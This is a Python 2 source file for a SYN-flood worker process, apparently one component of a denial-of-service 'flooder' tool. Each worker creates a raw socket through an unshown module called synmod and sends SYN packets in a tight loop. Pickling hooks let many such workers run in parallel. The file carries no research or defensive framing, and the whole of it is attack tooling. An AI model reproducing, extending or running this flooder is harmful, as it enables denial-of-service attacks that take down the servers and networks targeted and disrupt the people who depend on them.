import time
from Functions import *
from multiprocessing import Process
import synmod

class SYNWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id

        self.wait = flooder.wait
        self.running = True
        self.byteCount = 0
        self.socket = synmod.createSocket()
        
        if self.socket == -1:
            self.running = False

        print "initialized syn thread"
        
    def stop(self):
        self.running = False

    def run(self):
        try:
            while self.running:
                ret = synmod.send(self.socket)
                if ret == -1:
                    self.running = False
                if self.wait:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            return

    def __getstate__(self):
        odict = self.__dict__.copy()
        del odict['socket']
        return odict

    def __setstate__(self, dict):
        self.__dict__.update(dict)
        self.socket = synmod.createSocket()
